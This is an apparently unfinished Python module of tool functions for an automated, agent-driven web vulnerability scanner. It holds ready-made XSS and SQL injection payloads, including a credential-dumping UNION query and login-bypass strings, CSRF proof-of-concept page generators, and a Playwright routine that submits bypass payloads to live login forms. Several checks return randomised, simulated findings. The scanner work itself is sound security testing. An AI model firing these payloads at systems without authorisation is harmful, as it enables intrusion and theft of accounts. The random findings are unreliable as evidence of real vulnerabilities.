from typing import Dict, List, Any, Optional
import os
import json
import re
from datetime import datetime
import urllib.parse
from playwright.sync_api import Page

from utils.logger import get_logger
from utils.list_helper import load_common_passwords

# Function to support the PlannerAgent
def create_security_plan(tasks: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Create a structured security testing plan."""
    logger = get_logger()
    logger.info(f"Creating security plan with {len(tasks)} tasks")
    
    # Validate tasks
    valid_tasks = []
    for task in tasks:
        if "type" in task and "target" in task and "priority" in task:
            valid_tasks.append(task)
        else:
            logger.warning(f"Skipping invalid task: {task}")
    
    return {
        "tasks": valid_tasks,
        "timestamp": datetime.now().isoformat()
    }

# CSRF testing functions
def check_csrf_protection(target_url: str, form_id: Optional[str] = None, check_referer: bool = True, check_origin: bool = True, **kwargs) -> Dict[str, Any]:
    """Check if a form is protected against CSRF attacks."""
    logger = get_logger()
    logger.info(f"Checking CSRF protection for {target_url}, form: {form_id}")
    
    # In a real implementation, this would interact with the scanner to check CSRF protections
    # For now, we'll simulate the process
    
    # Simulate a CSRF vulnerability (random for this example)
    import random
    has_token = random.choice([True, False])
    checks_referer = check_referer and random.choice([True, False])
    checks_origin = check_origin and random.choice([True, False])
    
    # Determine if vulnerable
    is_vulnerable = not has_token and not (checks_referer or checks_origin)
    
    if is_vulnerable:
        logger.info(f"Potential CSRF vulnerability found in {target_url}")
        return {
            "csrf_found": True,
            "url": target_url,
            "form_id": form_id,
            "has_csrf_token": has_token,
            "checks_referer": checks_referer,
            "checks_origin": checks_origin,
            "severity": "high",
            "description": f"Cross-Site Request Forgery vulnerability found in form {form_id or 'unknown'}.",
            "evidence": "Form submission does not include CSRF token and does not validate origin or referer headers.",
            "reproduction_steps": [
                f"Navigate to {target_url}",
                "Create a forged request that mimics the form submission",
                "Submit the forged request from a different origin",
                "Observe the request is processed without validation"
            ],
            "remediation": "Implement anti-CSRF tokens for all state-changing operations. Consider using the SameSite cookie attribute and requiring re-authentication for sensitive actions.",
            "timestamp": datetime.now().isoformat()
        }
    
    # No vulnerability found
    return {
        "csrf_found": False,
        "url": target_url,
        "form_id": form_id,
        "has_csrf_token": has_token,
        "checks_referer": checks_referer,
        "checks_origin": checks_origin,
        "timestamp": datetime.now().isoformat()
    }

def generate_csrf_poc(target_url: str, request_method: str, form_data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a Proof of Concept (PoC) for CSRF vulnerability."""
    logger = get_logger()
    logger.info(f"Generating CSRF PoC for {target_url} using {request_method} method")
    
    # Create a basic HTML PoC for the CSRF attack
    if not form_data:
        form_data = {}
    
    if request_method.upper() == "GET":
        # For GET requests, create a simple link or img tag
        params = '&'.join([f"{k}={v}" for k, v in form_data.items()])
        url_with_params = f"{target_url}?{params}" if params else target_url
        
        poc_html = f"""<html>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Click the link below to trigger the CSRF attack:</p>
    <a href="{url_with_params}" target="_blank">Click here</a>
    
    <!-- Automatic exploitation using img tag -->
    <img src="{url_with_params}" style="display:none" alt="CSRF PoC">
</body>
</html>"""
    else:  # POST request
        # For POST requests, create an auto-submitting form
        form_fields = ""
        for key, value in form_data.items():
            form_fields += f"    <input type=\"hidden\" name=\"{key}\" value=\"{value}\">\n"
        
        poc_html = f"""<html>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This form will automatically submit to perform the CSRF attack:</p>
    
    <form id="csrf-poc" action="{target_url}" method="POST">
{form_fields}
    </form>
    
    <script>
        // Auto-submit the form when the page loads
        window.onload = function() {{
            document.getElementById("csrf-poc").submit();
        }};
    </script>
    
    <p>If the form doesn't submit automatically, click the button below:</p>
    <button type="submit" form="csrf-poc">Submit</button>
</body>
</html>"""
    
    return {
        "poc_html": poc_html,
        "target_url": target_url,
        "request_method": request_method,
        "form_data": form_data,
        "timestamp": datetime.now().isoformat()
    }

# XSS testing functions
def generate_xss_payloads(context: str, count: int = 5, encoding: str = "none") -> Dict[str, Any]:
    """Generate XSS payloads based on context."""
    logger = get_logger()
    logger.info(f"Generating {count} XSS payloads for {context} context with {encoding} encoding")
    
    # Define payloads for different contexts
    context_payloads = {
        "html": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ],
        "attribute": [
            "\" onerror=alert('XSS')\"",
            "\" onmouseover=alert('XSS')\"",
            "javascript:alert('XSS')",
            "' onload=alert('XSS') '",
            "\" autofocus onfocus=alert('XSS')\""
        ],
        "javascript": [
            "'-alert('XSS')-'",
            "';alert('XSS')//",
            "\\';alert('XSS')//",
            "</script><script>alert('XSS')</script>",
            "alert('XSS')"
        ],
        "url": [
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "%0a%0djavascript:alert('XSS')",
            "javascript://%0aalert('XSS')",
            "javascript://comment%0aalert('XSS')"
        ]
    }
    
    # Select payloads based on context
    selected_payloads = context_payloads.get(context.lower(), context_payloads["html"])[:count]
    
    # Apply encoding if needed
    if encoding != "none":
        # Apply different encodings (simplified implementation)
        if encoding == "url":
            from urllib.parse import quote
            selected_payloads = [quote(p) for p in selected_payloads]
        elif encoding == "html":
            import html
            selected_payloads = [html.escape(p) for p in selected_payloads]
        elif encoding == "base64":
            import base64
            selected_payloads = [base64.b64encode(p.encode()).decode() for p in selected_payloads]
    
    return {
        "payloads": selected_payloads,
        "context": context,
        "encoding": encoding,
        "count": len(selected_payloads)
    }

def test_xss_payload(target_url: str, payload: str, injection_point: str, parameter_name: Optional[str] = None) -> Dict[str, Any]:
    """Test an XSS payload against a target."""
    logger = get_logger()
    logger.info(f"Testing XSS payload: {payload} against {target_url} via {injection_point}")
    
    # In a real implementation, this would interact with the scanner to test the payload
    # For now, we'll simulate the process
    
    # Simulate a successful XSS detection
    if "<script>alert(" in payload or "javascript:alert(" in payload:
        # This is a simplified simulation - in reality, we would need to actually test the payload
        logger.info(f"Potential XSS vulnerability found with payload: {payload}")
        return {
            "xss_found": True,
            "payload": payload,
            "injection_point": injection_point,
            "parameter": parameter_name,
            "url": target_url,
            "severity": "high",
            "description": f"Cross-Site Scripting vulnerability found in {injection_point}.",
            "evidence": f"Payload: {payload}\nTriggered alert dialog in browser.",
            "reproduction_steps": [
                f"Navigate to {target_url}",
                f"Insert the payload {payload} into the {injection_point}",
                "Submit the form or trigger the action",
                "Observe the JavaScript alert dialog"
            ],
            "remediation": "Implement proper input validation and output encoding. Use context-specific encoding for different parts of the HTML document.",
            "timestamp": datetime.now().isoformat()
        }
    
    # No vulnerability found
    return {
        "xss_found": False,
        "payload": payload,
        "injection_point": injection_point,
        "parameter": parameter_name,
        "url": target_url,
        "timestamp": datetime.now().isoformat()
    }

# SQL Injection testing functions
def generate_sqli_payloads(database_type: str, injection_type: str = "all", count: int = 5, **kwargs) -> Dict[str, Any]:
    """Generate SQL Injection payloads based on database type."""
    logger = get_logger()
    logger.info(f"Generating {count} SQLi payloads for {database_type} database with {injection_type} injection type")
    
    # Define payloads for different database types and injection types
    db_payloads = {
        "mysql": {
            "union": [
                "' UNION SELECT 1,2,3,4 -- -",
                "' UNION SELECT 1,2,@@version,4 -- -",
                "' UNION SELECT 1,table_name,3,4 FROM information_schema.tables -- -",
                "' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' -- -",
                "' UNION SELECT 1,concat(username,':',password),3,4 FROM users -- -"
            ],
            "boolean": [
                "' OR 1=1 -- -",
                "' OR '1'='1' -- -",
                "admin' -- -",
                "admin' OR '1'='1' -- -",
                "' OR 'x'='x' -- -"
            ],
            "error": [
                "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -",
                "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -",
                "' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- -",
                "' OR UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1) -- -",
                "' OR PROCEDURE ANALYSE(EXTRACTVALUE(5151,CONCAT(0x5c,VERSION())),1) -- -"
            ],
            "time": [
                "' OR SLEEP(5) -- -",
                "' OR BENCHMARK(10000000,MD5(NOW())) -- -",
                "' OR IF(1=1,SLEEP(5),0) -- -",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- -",
                "'; SELECT SLEEP(5) -- -"
            ]
        },
        # Add other databases if needed
    }
    
    # Get payloads for specified database and injection type
    db_type = database_type.lower()
    if db_type not in db_payloads:
        db_type = "mysql"  # Default to MySQL if database type not supported
    
    if injection_type.lower() == "all":
        # Combine all injection types
        all_payloads = []
        for inj_payloads in db_payloads[db_type].values():
            all_payloads.extend(inj_payloads)
        selected_payloads = all_payloads[:count]
    else:
        inj_type = injection_type.lower()
        if inj_type not in db_payloads[db_type]:
            inj_type = list(db_payloads[db_type].keys())[0]  # Default to first type if not found
        selected_payloads = db_payloads[db_type][inj_type][:count]
    
    return {
        "payloads": selected_payloads,
        "database_type": db_type,
        "injection_type": injection_type,
        "count": len(selected_payloads)
    }

def test_sqli_payload(target_url: str, payload: str, injection_point: str, parameter_name: Optional[str] = None, detection_method: str = "error", **kwargs) -> Dict[str, Any]:
    """Test a SQL Injection payload against a target."""
    logger = get_logger()
    logger.info(f"Testing SQLi payload: {payload} against {target_url} via {injection_point} using {detection_method} detection")
    
    # In a real implementation, this would interact with the scanner to test the payload
    # For now, we'll simulate the process
    
    # Simulate a successful SQLi detection (simplified)
    sql_indicators = ["'--", "OR 1=1", "UNION SELECT", "' OR '", "1' OR '1'='1", "1=1", "--"]
    
    if any(indicator in payload for indicator in sql_indicators):
        # This is a simplified simulation - in reality, we would need to actually test the payload
        logger.info(f"Potential SQL Injection vulnerability found with payload: {payload}")
        return {
            "sqli_found": True,
            "payload": payload,
            "injection_point": injection_point,
            "parameter": parameter_name,
            "url": target_url,
            "detection_method": detection_method,
            "severity": "critical",
            "description": f"SQL Injection vulnerability found in {injection_point}.",
            "evidence": f"Payload: {payload}\nDetected using {detection_method} method.",
            "reproduction_steps": [
                f"Navigate to {target_url}",
                f"Insert the payload {payload} into the {injection_point}",
                "Submit the form or trigger the action",
                f"Observe the {detection_method} indicators"
            ],
            "remediation": "Use parameterized queries or prepared statements instead of dynamically building SQL queries. Implement proper input validation.",
            "timestamp": datetime.now().isoformat()
        }
    
    # No vulnerability found
    return {
        "sqli_found": False,
        "payload": payload,
        "injection_point": injection_point,
        "parameter": parameter_name,
        "url": target_url,
        "detection_method": detection_method,
        "timestamp": datetime.now().isoformat()
    }

# Authentication testing functions
def test_password_policy(target_url: str, signup_path: Optional[str] = None, test_passwords: Optional[List[str]] = None, **kwargs) -> Dict[str, Any]:
    """Test the password policy strength."""
    logger = get_logger()
    logger.info(f"Testing password policy on {target_url}")
    
    # Handle incorrectly named parameters (like #signup_path instead of signup_path)
    # This can happen if the parameter name has special characters
    if '#signup_path' in kwargs and signup_path is None:
        signup_path = kwargs.get('#signup_path')
        logger.info(f"Corrected parameter: Using #signup_path value: {signup_path}")
    
    # In a real implementation, this would interact with the scanner to test passwords
    # For now, we'll simulate the process
    
    if not test_passwords:
        # Load common passwords from the list file, limit to 20 passwords for testing
        test_passwords = load_common_passwords(20)
    
    # Simulate password policy checks
    weak_accepted = False
    min_length = 8  # Simulated minimum length
    requires_complexity = True  # Simulated complexity requirement
    
    # Check each password against the policy
    results = []
    for password in test_passwords:
        # Simulate policy checks
        meets_length = len(password) >= min_length
        has_uppercase = any(c.isupper() for c in password)
        has_lowercase = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        complexity_score = sum([has_uppercase, has_lowercase, has_digit, has_special])
        meets_complexity = complexity_score >= 3 if requires_complexity else True
        
        accepted = meets_length and meets_complexity
        
        results.append({
            "password": password,
            "accepted": accepted,
            "meets_length": meets_length,
            "meets_complexity": meets_complexity
        })
        
        if accepted and (password in ["password", "123456", "qwerty", "admin"]):
            weak_accepted = True
    
    # Determine if there's a vulnerability
    has_issue = weak_accepted or not (min_length >= 8 and requires_complexity)
    
    if has_issue:
        logger.info(f"Potential password policy issues found in {target_url}")
        return {
            "auth_issue_found": True,
            "issue_type": "Weak Password Policy",
            "url": target_url,
            "weak_passwords_accepted": weak_accepted,
            "min_length": min_length,
            "requires_complexity": requires_complexity,
            "test_results": results,
            "severity": "medium",
            "description": "The application's password policy is insufficient, allowing weak passwords that could be easily guessed or brute-forced.",
            "evidence": f"Minimum length: {min_length}, Requires complexity: {requires_complexity}\nWeak passwords accepted: {weak_accepted}",
            "remediation": "Implement a strong password policy that requires at least 8 characters, a mix of uppercase and lowercase letters, numbers, and special characters. Consider implementing additional measures like password history and account lockout after failed attempts.",
            "timestamp": datetime.now().isoformat()
        }
    
    # No vulnerability found
    return {
        "auth_issue_found": False,
        "url": target_url,
        "min_length": min_length,
        "requires_complexity": requires_complexity,
        "test_results": results,
        "timestamp": datetime.now().isoformat()
    }

def check_session_security(target_url: str, check_httponly: bool = True, check_secure: bool = True, check_samesite: bool = True, **kwargs) -> Dict[str, Any]:
    """Check session cookie security settings."""
    logger = get_logger()
    logger.info(f"Checking session cookie security for {target_url}")
    
    # In a real implementation, this would interact with the scanner to check session cookies
    # For now, we'll simulate the process
    
    # Simulate cookie security checks
    import random
    has_httponly = not check_httponly or random.choice([True, False])
    has_secure = not check_secure or random.choice([True, False])
    has_samesite = not check_samesite or random.choice([True, False])
    
    # Determine if there are security issues
    has_issues = not (has_httponly and has_secure and has_samesite)
    
    if has_issues:
        missing_flags = []
        if not has_httponly and check_httponly:
            missing_flags.append("HttpOnly")
        if not has_secure and check_secure:
            missing_flags.append("Secure")
        if not has_samesite and check_samesite:
            missing_flags.append("SameSite")
        
        logger.info(f"Session cookie security issues found in {target_url}: {', '.join(missing_flags)}")
        return {
            "auth_issue_found": True,
            "issue_type": "Insecure Session Cookies",
            "url": target_url,
            "has_httponly": has_httponly,
            "has_secure": has_secure,
            "has_samesite": has_samesite,
            "missing_flags": missing_flags,
            "severity": "high",
            "description": f"Session cookies are missing important security flags: {', '.join(missing_flags)}.",
            "evidence": f"Cookie flags: HttpOnly={has_httponly}, Secure={has_secure}, SameSite={has_samesite}",
            "remediation": "Set the HttpOnly flag to prevent client-side script access to cookies. Set the Secure flag to ensure cookies are only sent over HTTPS. Set the SameSite attribute to 'Lax' or 'Strict' to prevent CSRF attacks.",
            "timestamp": datetime.now().isoformat()
        }
    
    # No vulnerability found
    return {
        "auth_issue_found": False,
        "url": target_url,
        "has_httponly": has_httponly,
        "has_secure": has_secure,
        "has_samesite": has_samesite,
        "timestamp": datetime.now().isoformat()
    }

# Validation functions
def validate_vulnerability(vulnerability_type: str, target_url: str, proof: Optional[str] = None, validation_steps: Optional[List[str]] = None, **kwargs) -> Dict[str, Any]:
    """Validate a reported vulnerability."""
    logger = get_logger()
    logger.info(f"Validating {vulnerability_type} vulnerability on {target_url}")
    
    # In a real implementation, this would interact with the scanner to validate the vulnerability
    # For now, we'll simulate the process
    
    # Simulate validation (random for this example)
    import random
    validation_successful = random.choice([True, False, True])  # Bias towards success for demonstration
    
    if validation_successful:
        logger.info(f"Successfully validated {vulnerability_type} vulnerability on {target_url}")
        return {
            "validated": True,
            "vulnerability_type": vulnerability_type,
            "target_url": target_url,
            "proof": proof,
            "validation_details": {
                "method": "Automated validation",
                "result": "Vulnerability confirmed",
                "confidence": "high",
                "steps_performed": validation_steps or ["Automated validation performed"]
            },
            "timestamp": datetime.now().isoformat()
        }
    else:
        logger.info(f"Failed to validate {vulnerability_type} vulnerability on {target_url}")
        return {
            "validated": False,
            "vulnerability_type": vulnerability_type,
            "target_url": target_url,
            "validation_details": {
                "method": "Automated validation",
                "result": "Could not confirm vulnerability",
                "confidence": "low",
                "steps_performed": validation_steps or ["Automated validation performed"],
                "failure_reason": "Could not reproduce the reported behavior"
            },
            "timestamp": datetime.now().isoformat()
        }

def execute_javascript(script: str, context: Optional[Dict[str, Any]] = None, **kwargs) -> Dict[str, Any]:
    """Execute JavaScript code with optional context variables."""
    logger = get_logger()
    logger.info(f"Executing JavaScript: {script[:50]}{'...' if len(script) > 50 else ''}")
    
    # In a real implementation, this would interact with the scanner to execute JavaScript
    # For now, we'll simulate the process
    
    # Simulate successful execution
    return {
        "success": True,
        "result": "JavaScript execution simulated",
        "timestamp": datetime.now().isoformat()
    }

def parse_url(url: str, **kwargs) -> Dict[str, Any]:
    """Parse a URL into its components."""
    logger = get_logger()
    logger.info(f"Parsing URL: {url}")
    
    try:
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        # Convert query params from lists to single values for cleaner output
        # (parse_qs returns lists because a param can appear multiple times)
        single_query_params = {}
        for key, value in query_params.items():
            single_query_params[key] = value[0] if len(value) == 1 else value
        
        return {
            "success": True,
            "scheme": parsed.scheme,
            "netloc": parsed.netloc,
            "path": parsed.path,
            "params": parsed.params,
            "query": parsed.query,
            "query_params": single_query_params,
            "fragment": parsed.fragment,
            "url": url
        }
    except Exception as e:
        logger.error(f"Error parsing URL: {str(e)}")
        return {
            "success": False,
            "error": str(e),
            "url": url
        }

def run_login_sqli_test(page: Page, form_selector: str, username_field: str, password_field: str, submit_button: str, max_tests: int = 3, timeout_per_test: int = 10000, **kwargs) -> Dict[str, Any]:
    """Test a login form specifically for SQL injection vulnerabilities.
    
    This function tests common SQL injection payloads that can bypass authentication
    by focusing on login form behavior and authentication-specific indicators.
    
    Args:
        page: The Playwright page object
        form_selector: CSS or XPath selector for the login form
        username_field: CSS or XPath selector for the username field
        password_field: CSS or XPath selector for the password field
        submit_button: CSS or XPath selector for the submit button
        max_tests: Maximum number of payloads to test (to avoid hanging)
        timeout_per_test: Timeout per test in milliseconds
    """
    logger = get_logger()
    logger.info(f"Testing login form SQL injection on {page.url}")
    
    # Store the original URL to detect redirects after login
    original_url = page.url
    original_content = page.content()
    
    # Check for modal triggers that might show login forms
    # These are common patterns for modal/popup login forms
    modal_triggers = [
        "a[href='#login']", 
        "a[href='#loginModal']", 
        "a[href='#myModal']",
        "button.login", 
        "button.signin", 
        "[data-toggle='modal']",
        ".login-button", 
        ".signin-button",
        "a:has-text('Login')", 
        "a:has-text('Sign In')"
    ]
    
    # Try to detect and click modal triggers if the form isn't visible
    form_visible = False
    try:
        # First check if the form is already visible
        form_elem = page.query_selector(form_selector)
        if form_elem:
            form_visible = form_elem.is_visible()
            logger.info(f"Login form visibility check: {form_visible}")
    except Exception as e:
        logger.error(f"Error checking form visibility: {str(e)}")
    
    # If form is not visible, try to find and click a trigger
    if not form_visible:
        logger.info("Login form not visible, looking for modal triggers...")
        
        for trigger in modal_triggers:
            try:
                trigger_elem = page.query_selector(trigger)
                if trigger_elem and trigger_elem.is_visible():
                    logger.info(f"Found potential login modal trigger: {trigger}")
                    trigger_elem.click()
                    # Wait for any animations to complete
                    page.wait_for_timeout(1000)
                    
                    # Check if form is now visible
                    form_elem = page.query_selector(form_selector)
                    if form_elem and form_elem.is_visible():
                        logger.info("Successfully opened login form modal")
                        form_visible = True
                        break
            except Exception as e:
                logger.error(f"Error attempting to click modal trigger {trigger}: {str(e)}")
    
    # If we still can't find a visible form, try to auto-detect login forms
    if not form_visible:
        logger.warning("Could not find visible login form with provided selectors or modal triggers")
        return {
            "sqli_found": False,
            "url": page.url,
            "error": "Could not find visible login form",
            "timestamp": datetime.now().isoformat()
        }
    
    # Define authentication bypass SQL injection payloads specifically for login forms
    auth_bypass_payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1#",
        "admin' --",
        "admin' OR '1'='1",
        "admin'/**/OR/**/1=1#",
        "' OR '1'='1' -- -",
        "username' OR 1=1 LIMIT 1;--",
        "1' or '1' = '1'",  # Fixed complex payload
        "admin')-- -"
    ]
    
    # Look for login forms if selector not provided
    if not form_selector:
        # Try to automatically detect login forms
        login_form_indicators = [
            "//form[contains(@action, 'login')]",
            "//form[contains(@id, 'login')]",
            "//form[contains(@class, 'login')]",
            "//form[.//input[@type='password']]"
        ]
        
        for indicator in login_form_indicators:
            try:
                if page.query_selector(indicator):
                    form_selector = indicator
                    logger.info(f"Detected login form with selector: {form_selector}")
                    break
            except:
                continue
    
    # If still no form found, return early
    if not form_selector:
        logger.warning("No login form detected on the page")
        return {
            "sqli_found": False,
            "url": page.url,
            "description": "No login form detected for SQL injection testing",
            "timestamp": datetime.now().isoformat()
        }
    
    # Successful login indicators
    success_indicators = [
        # URL changes (redirects to dashboard, account, etc.)
        lambda p: p.url != original_url and not "login" in p.url.lower() and not "error" in p.url.lower(),
        
        # Common success messages in content
        lambda p: any(msg in p.content().lower() for msg in ["welcome", "logged in", "dashboard", "account", "profile", "success"]),
        
        # Presence of logout functionality after login
        lambda p: bool(p.query_selector("//a[contains(., 'logout') or contains(@href, 'logout')]")),
        
        # Presence of user-specific content
        lambda p: bool(p.query_selector("//div[contains(@class, 'user') or contains(@id, 'user')]")),
        
        # Cookie changes indicating successful authentication
        lambda p: len(p.context.cookies()) > len(page.context.cookies())
    ]
    
    # Test each payload (limit to max_tests to avoid hanging)
    import time
    start_time = time.time()
    tests_completed = 0
    
    # Use only a subset of payloads to avoid hanging
    limited_payloads = auth_bypass_payloads[:max_tests]
    logger.info(f"Testing {len(limited_payloads)} of {len(auth_bypass_payloads)} available SQL injection payloads")
    
    for payload in limited_payloads:
        # Check if we're approaching the overall timeout
        elapsed_time = (time.time() - start_time) * 1000  # convert to ms
        if elapsed_time > timeout_per_test * max_tests:
            logger.warning(f"Overall testing timeout reached after {elapsed_time:.0f}ms. Stopping.")
            break
            
        # Increment test counter
        tests_completed += 1
        
        try:
            # Set a timeout for this specific test
            test_start_time = time.time()
            # Create a new page for each test to avoid state contamination
            test_page = page.context.new_page()
            test_page.goto(page.url, wait_until="networkidle")
            
            logger.info(f"Testing SQL injection payload on login form: {payload}")
            
            # Check for and try to activate modal/popup login forms
            for trigger in modal_triggers:
                try:
                    trigger_elem = test_page.query_selector(trigger)
                    if trigger_elem and trigger_elem.is_visible():
                        logger.info(f"Clicking login modal trigger: {trigger}")
                        trigger_elem.click()
                        # Wait for animations
                        test_page.wait_for_timeout(1000)
                        break
                except Exception as e:
                    logger.error(f"Error clicking modal trigger: {str(e)}")
            
            # Check if form and fields are visible before interacting
            form_element = test_page.query_selector(form_selector)
            if not form_element or not form_element.is_visible():
                logger.warning(f"Login form not visible, skipping payload: {payload}")
                test_page.close()
                continue
                
            # Check username field visibility
            if username_field:
                username_element = test_page.query_selector(username_field)
                if not username_element or not username_element.is_visible():
                    logger.warning(f"Username field not visible, skipping payload: {payload}")
                    test_page.close()
                    continue
                
                # Fill the username field with the payload
                logger.info(f"Filling username field with payload: {payload}")
                test_page.fill(username_field, payload)
            
            # Check password field visibility
            if password_field:
                password_element = test_page.query_selector(password_field)
                if not password_element or not password_element.is_visible():
                    logger.warning(f"Password field not visible, skipping payload: {payload}")
                    test_page.close()
                    continue
                
                # Fill the password field
                logger.info("Filling password field with dummy value")
                test_page.fill(password_field, "anything")  # Password doesn't matter for this attack
            
            # Check submit button visibility
            submit_element = test_page.query_selector(submit_button)
            if not submit_element or not submit_element.is_visible():
                logger.warning(f"Submit button not visible, skipping payload: {payload}")
                test_page.close()
                continue
            
            # Submit the form
            logger.info("Clicking submit button")
            test_page.click(submit_button)
            
            # Wait for navigation or a timeout
            try:
                test_page.wait_for_load_state("networkidle", timeout=5000)
            except Exception as e:
                logger.warning(f"Timeout waiting for page load: {str(e)}")
                # Timeout is not necessarily a failure for this test
                pass
            
            # Check if individual test is taking too long
            if (time.time() - test_start_time) * 1000 > timeout_per_test:
                logger.warning(f"Individual test timeout reached for payload: {payload}")
                test_page.close()
                break
                
            # Check for bypass indicators
            for check in success_indicators:
                try:
                    if check(test_page):
                        # We have a potential SQL injection vulnerability (authentication bypass)
                        logger.info(f"Potential SQL injection authentication bypass with payload: {payload}")
                        
                        # Close the test page
                        test_page.close()
                        
                        return {
                            "sqli_found": True,
                            "payload": payload,
                            "url": page.url,
                            "form": form_selector,
                            "username_field": username_field,
                            "bypass_detected": True,
                            "severity": "critical",
                            "description": "SQL Injection vulnerability in login form enabling authentication bypass.",
                            "evidence": f"Payload: {payload}\nAuthentication bypass successful.",
                            "reproduction_steps": [
                                f"Navigate to {page.url}",
                                f"Enter '{payload}' in the username field",
                                "Enter any value in the password field",
                                "Submit the login form",
                                "Observe successful authentication without valid credentials"
                            ],
                            "remediation": "Use parameterized queries or prepared statements instead of dynamically building SQL queries. Never concatenate user input directly into SQL queries. Implement proper input validation.",
                            "timestamp": datetime.now().isoformat()
                        }
                except Exception as e:
                    logger.error(f"Error checking success indicator: {str(e)}")
            
            # Close the test page
            test_page.close()
            
        except Exception as e:
            logger.error(f"Error testing SQL injection payload {payload}: {str(e)}")
            try:
                test_page.close()
            except:
                pass
    
    # No vulnerabilities found - include diagnostic info
    return {
        "sqli_found": False,
        "url": page.url,
        "form": form_selector,
        "payloads_tested": limited_payloads,
        "tests_completed": tests_completed,
        "total_time_ms": (time.time() - start_time) * 1000,
        "modal_detected": form_visible,
        "timestamp": datetime.now().isoformat()
    }


def test_login_sqli(*args, **kwargs) -> Dict[str, Any]:
    """Backward-compatible wrapper for older imports."""
    return run_login_sqli_test(*args, **kwargs)


# Prevent pytest from collecting this compatibility wrapper as a test.
test_login_sqli.__test__ = False

def analyze_response(status_code: int, headers: Dict[str, str], body: str, **kwargs) -> Dict[str, Any]:
    """Analyze an HTTP response for security issues."""
    logger = get_logger()
    logger.info(f"Analyzing HTTP response with status code: {status_code}")
    
    issues = []
    
    # Check for sensitive information in response
    sensitive_patterns = [
        r"password|passwd|pwd",
        r"api[_-]?key",
        r"secret[_-]?key",
        r"access[_-]?token",
        r"auth[_-]?token",
        r"jwt",
        r"bearer",
        r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"  # Simple email regex
    ]
    
    for pattern in sensitive_patterns:
        matches = re.finditer(pattern, body, re.IGNORECASE)
        for match in matches:
            issues.append({
                "type": "sensitive_info",
                "pattern": pattern,
                "match": match.group(),
                "position": match.span()
            })
    
    # Check headers
    security_headers = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": ["DENY", "SAMEORIGIN"],
        "X-XSS-Protection": "1; mode=block",
        "Content-Security-Policy": None,  # Any value is good
        "Strict-Transport-Security": None,  # Any value is good
        "Cache-Control": None  # Check presence only
    }
    
    missing_headers = []
    for header, expected_value in security_headers.items():
        if header not in headers:
            missing_headers.append(header)
        elif expected_value:
            if isinstance(expected_value, list):
                if headers[header] not in expected_value:
                    issues.append({
                        "type": "insecure_header",
                        "header": header,
                        "value": headers[header],
                        "expected": f"One of {expected_value}"
                    })
            elif headers[header] != expected_value:
                issues.append({
                    "type": "insecure_header",
                    "header": header,
                    "value": headers[header],
                    "expected": expected_value
                })
    
    if missing_headers:
        issues.append({
            "type": "missing_headers",
            "headers": missing_headers
        })
    
    # Check for error messages that might reveal too much information
    error_patterns = [
        r"exception|error|failure|failed|stack trace|syntax error|unexpected|warning",
        r"ORA-[0-9]+|SQL syntax|mysql_fetch|SQL Server|ODBC Driver|PostgreSQL",
        r"RuntimeException|NullPointerException|ClassNotFoundException|mysqli_error",
        r"File not found|cannot find file|No such file or directory"
    ]
    
    for pattern in error_patterns:
        matches = re.finditer(pattern, body, re.IGNORECASE)
        for match in matches:
            # Check some context around the match to see if it's likely an error message
            start = max(0, match.start() - 20)
            end = min(len(body), match.end() + 20)
            context = body[start:end]
            
            if re.search(r"error|exception|fail|issue|problem|incorrect", context, re.IGNORECASE):
                issues.append({
                    "type": "error_disclosure",
                    "pattern": pattern,
                    "match": match.group(),
                    "context": context,
                    "position": match.span()
                })
    
    return {
        "status_code": status_code,
        "issues_found": len(issues) > 0,
        "issues": issues,
        "headers_analyzed": True,
        "body_analyzed": True,
        "timestamp": datetime.now().isoformat()
    }

def get_request_body(method: str, content_type: str, params: Dict[str, Any]) -> Dict[str, Any]:
    """Generate a request body based on method and content type."""
    logger = get_logger()
    logger.info(f"Generating request body for {method} request with content type: {content_type}")
    
    if method.upper() == "GET":
        # For GET requests, convert params to query string
        query_string = urllib.parse.urlencode(params)
        return {
            "success": True,
            "body_type": "query_string",
            "body": query_string,
            "method": method,
            "content_type": None  # GET requests typically don't have a content type
        }
    
    # For other methods (POST, PUT, etc.)
    content_type = content_type.lower()
    
    if "application/json" in content_type:
        # JSON body
        try:
            body = json.dumps(params)
            return {
                "success": True,
                "body_type": "json",
                "body": body,
                "method": method,
                "content_type": "application/json"
            }
        except Exception as e:
            logger.error(f"Error creating JSON body: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "method": method,
                "content_type": content_type
            }
    
    elif "application/x-www-form-urlencoded" in content_type:
        # Form urlencoded body
        body = urllib.parse.urlencode(params)
        return {
            "success": True,
            "body_type": "form",
            "body": body,
            "method": method,
            "content_type": "application/x-www-form-urlencoded"
        }
    
    elif "multipart/form-data" in content_type:
        # Multipart form data (simplified, as this would typically require a boundary)
        return {
            "success": True,
            "body_type": "multipart",
            "body": "Multipart form data would be generated here",
            "method": method,
            "content_type": "multipart/form-data"
        }
    
    else:
        # Default to plain text
        if isinstance(params, dict):
            body = json.dumps(params)
        else:
            body = str(params)
        
        return {
            "success": True,
            "body_type": "text",
